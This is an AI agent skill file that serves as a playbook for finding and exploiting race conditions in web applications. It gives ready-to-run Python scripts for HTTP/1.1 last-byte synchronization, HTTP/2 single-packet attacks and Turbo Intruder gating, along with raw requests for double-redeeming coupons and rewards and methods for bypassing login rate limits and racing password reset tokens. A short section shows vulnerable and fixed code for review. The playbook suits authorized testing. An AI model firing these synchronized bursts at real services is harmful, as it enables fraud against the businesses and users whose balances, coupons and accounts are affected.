---
name: race-condition
description: Race condition and TOCTOU testing for web apps — HTTP/1.1 last-byte synchronization, HTTP/2 single-packet attack via multiplexing, Turbo Intruder gating, limit-overrun (double-redeem), rate-limit bypass, multi-step pipeline exploitation, and database-layer synchronization gaps.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: Race Conditions — Testing & Exploitation Playbook

> **AI LOAD INSTRUCTION**: Treat race conditions as authorization/state integrity issues — non-atomic read-then-write lets multiple requests observe stale state. Prioritize one-time operations (coupons, rewards, verifications) and balance/quota operations. Use HTTP/2 single-packet attack or Turbo Intruder gating for synchronized delivery. Base models often suggest sequential retries instead of truly parallel synchronized requests.

## 0. RELATED ROUTING

- business-logic-vulnerabilities — coupon/reward/order race conditions
- http2-specific-attacks — single-packet attack mechanics
- auth — password reset token race, MFA bypass

---

## 1. WHAT TO TEST FIRST

| Priority | Operation Class | Example Paths |
|---|---|---|
| 1 | One-time redeem / coupon / bonus | `/redeem`, `/apply_coupon`, `/claim_reward`, `/voucher` |
| 2 | Balance / quota / stock deduction | `/transfer`, `/purchase`, `/reserve`, `/inventory` |
| 3 | Invite / referral / signup bonus | `/invite_accept`, `/referral_claim` |
| 4 | Password / MFA / email verification | `/verify_token`, `/confirm_email`, `/reset_password` |
| 5 | Idempotent-looking APIs without strong idempotency keys | POST that should succeed once per user |

**First moves**:
1. Capture the state-changing request in proxy.
2. Send 20–100 copies **simultaneously** (not sequentially).
3. Classify: 0/1 expected successes vs N successes or inconsistent final state.

---

## 2. CORE CONCEPTS

### 2.1 TOCTOU (Time-of-check to time-of-use)

```
Thread A                    Thread B
   |                            |
   +-- CHECK (resource OK)      |
   |                            +-- CHECK (resource OK)  ← both see "OK"
   +-- USE / UPDATE             |
   |                            +-- USE / UPDATE          ← duplicate effect
```

### 2.2 Non-atomic Read-then-Write

Typical vulnerable pseudo-code:
```sql
balance = SELECT balance FROM accounts WHERE id = ?
if balance >= amount:
    UPDATE accounts SET balance = balance - ? WHERE id = ?
-- Two concurrent requests both pass the IF before either UPDATE commits
```

### 2.3 Database Synchronization Gaps

| Layer | What Goes Wrong |
|---|---|
| Application | In-memory flag or session says "not used" while DB already updated |
| ORM/service | Two instances, no distributed lock; each thinks it owns the decision |
| DB | Missing `SELECT … FOR UPDATE`, wrong isolation level, logic split across statements without transaction |
| API gateway | Per-IP rate limit is check-then-increment — parallel burst passes duplicate checks |

**Hint**: `UNIQUE` constraints and **idempotency keys** often eliminate entire bug classes. Test whether the app enforces them on the hot path.

---

## 3. ATTACK PATTERNS

### 3.1 Limit-Overrun (Double Redeem)

Send the same authenticated request many times in parallel:

```http
POST /api/v1/rewards/claim HTTP/1.1
Host: target.com
Authorization: Bearer <token>
Content-Type: application/json

{"reward_id":"welcome_bonus"}
```

**Success signal**: HTTP 200/201 more than once, duplicate ledger entries, balance higher than policy allows.

### 3.2 Rate-Limit Bypass via Simultaneity

If limits are implemented as counters checked per request without atomic increment:
```
Fire N parallel login attempts in one burst
Compare: N parallel vs N sequential attempts
Success signal: more failures accepted than cap, or lockout never triggers
```

### 3.3 Multi-Step Pipeline Race

Workflow: `create → pay → confirm`

If `confirm` doesn't cryptographically bind to `pay` completion:
1. Start two parallel pipelines from same session/item.
2. Complete `confirm` on channel B while `pay` on channel A is in-flight or abandoned.

**Success signal**: item marked paid/shipped without matching payment, state skips backward.

### 3.4 Password Reset Token Reuse

```
1. Request password reset → server generates token T1 and emails it
2. While T1 is valid, request another reset → server generates T2
3. Race: use T1 and T2 simultaneously to change password twice
   → If server doesn't invalidate old tokens on use, both succeed
```

---

## 4. HTTP/1.1 LAST-BYTE SYNCHRONIZATION

Hold all requests blocked until every socket has sent the full request except the last byte of the body; then release the final byte together:

```
Client 1: [headers + body - 1 byte] ----hold----+
Client 2: [headers + body - 1 byte] ----hold----+--> flush last byte together
Client N: [headers + body - 1 byte] ----hold----+
```

This reduces network jitter between copies compared to naive sequential sending.

**Implementation**:
```python
import socket, threading, time

def send_with_gate(host, port, request_header, request_body):
    """Send request, hold last byte until gate opens."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    # Send everything except last byte
    partial = (request_header + request_body[:-1]).encode()
    s.send(partial)
    return s, request_body[-1].encode()

# Prepare all connections
gate_sockets = []
for _ in range(20):
    s, last_byte = send_with_gate(host, port, header, body)
    gate_sockets.append((s, last_byte))

# Release all simultaneously
for s, last_byte in gate_sockets:
    s.send(last_byte)
```

---

## 5. HTTP/2 SINGLE-PACKET ATTACK

Multiplex several complete HTTP/2 streams and coalesce their frames so the first bytes of all requests exit the NIC in one TCP segment:

```
  [ Stream 1 (complete request) ]
  [ Stream 2 (complete request) ]  --HTTP/2→  one TCP burst  →  all arrive simultaneously
  [ Stream N (complete request) ]
```

Receiver-side processing achieves sub-millisecond spacing — zero network jitter.

### Burp Suite Single-Packet Attack

```
1. Capture state-changing request → Repeater
2. Right-click → Add to group → Create tab group
3. Duplicate request 20 times in group
4. Send group → "Send group in parallel (single-packet attack)"
5. Requires Burp Pro with HTTP/2 support
```

### Python h2 Library

```python
import h2.connection, h2.config, ssl, socket

sock = socket.create_connection(('target.com', 443))
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
ssl_sock = ctx.wrap_socket(sock, server_hostname='target.com')

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
ssl_sock.send(conn.data_to_send())

headers = [
    (':method', 'POST'), (':path', '/redeem'),
    (':authority', 'target.com'), (':scheme', 'https'),
    ('content-type', 'application/json'),
    ('authorization', f'Bearer {token}'),
]
body = b'{"coupon":"DISCOUNT50"}'

# Queue 20 requests
for i in range(20):
    stream_id = i * 2 + 1
    conn.send_headers(stream_id=stream_id, headers=headers)
    conn.send_data(stream_id=stream_id, data=body, end_stream=True)

# Send all in one burst
ssl_sock.send(conn.data_to_send())

# Read responses
# Count how many 200 OKs arrive
```

---

## 6. TURBO INTRUDER GATE PATTERN

Turbo Intruder (Burp extension) supports gate-based synchronized sending:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxRetriesPerRequest=0)
    
    # Queue all requests at the gate
    for i in range(20):
        engine.queue(target.req, gate='raceGate')
    
    # Fire everything simultaneously
    engine.openGate('raceGate')

def handleResponse(req, interesting):
    table.add(req)
```

**Gate pattern**: All requests wait at the gate until `openGate()` is called, then send simultaneously.

---

## 7. RECOGNIZING VULNERABLE PATTERNS IN CODE REVIEW

### Database Anti-Patterns

```python
# VULNERABLE: check-then-act without transaction
def redeem_coupon(user_id, coupon_code):
    coupon = db.query("SELECT * FROM coupons WHERE code=? AND redeemed=0", coupon_code)
    if coupon:
        db.execute("UPDATE coupons SET redeemed=1, user_id=? WHERE code=?", user_id, coupon_code)
        apply_discount(user_id)
    # Race: two threads both pass the SELECT, both apply discount

# SAFE: atomic update with row check
def redeem_coupon_safe(user_id, coupon_code):
    affected = db.execute(
        "UPDATE coupons SET redeemed=1, user_id=? WHERE code=? AND redeemed=0",
        user_id, coupon_code
    ).rowcount
    if affected == 1:
        apply_discount(user_id)
```

### Cache/Lock Anti-Patterns

```python
# VULNERABLE: Redis-based check without atomic operation
def process_once(task_id):
    if not redis.get(f"lock:{task_id}"):    # TOCTOU here
        redis.set(f"lock:{task_id}", "1")   # Another thread passes check before this
        do_work(task_id)

# SAFE: Redis SETNX (atomic set if not exists)
def process_once_safe(task_id):
    if redis.setnx(f"lock:{task_id}", "1"):  # Atomic: only one thread succeeds
        redis.expire(f"lock:{task_id}", 30)  # Always set TTL to avoid permanent lock
        do_work(task_id)
```

---

## 8. TIMING-BASED RACE CONDITION DETECTION

```python
import requests, concurrent.futures, time

url = "https://target.com/redeem"
headers = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}
data = {"coupon": "DISCOUNT50"}

def send_request(_):
    r = requests.post(url, json=data, headers=headers)
    return r.status_code, r.text[:100]

# Send 20 requests in parallel
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    results = list(executor.map(send_request, range(20)))

# Count successes
successes = [r for r in results if r[0] == 200]
print(f"Successes: {len(successes)} / {len(results)}")
# > 1 success = race condition confirmed
```

---

## 9. TESTING CHECKLIST

```
□ Identify one-time operations (coupons, rewards, verifications, password reset)
□ Identify balance/quota endpoints (transfer, purchase, inventory)
□ Set up parallel sending tool: Burp single-packet attack or Turbo Intruder gate
□ Send 20-50 simultaneous identical requests
□ Check if >1 success response received
□ Check final state (DB balance, coupon usage count, reward claimed count)
□ For rate limits: send burst of N parallel requests, check if all N pass
□ For multi-step flows: start parallel flows, interleave steps
□ Test HTTP/2 endpoints with single-packet attack (tightest synchronization)
□ For HTTP/1.1 targets: use last-byte sync or Turbo Intruder gating
```
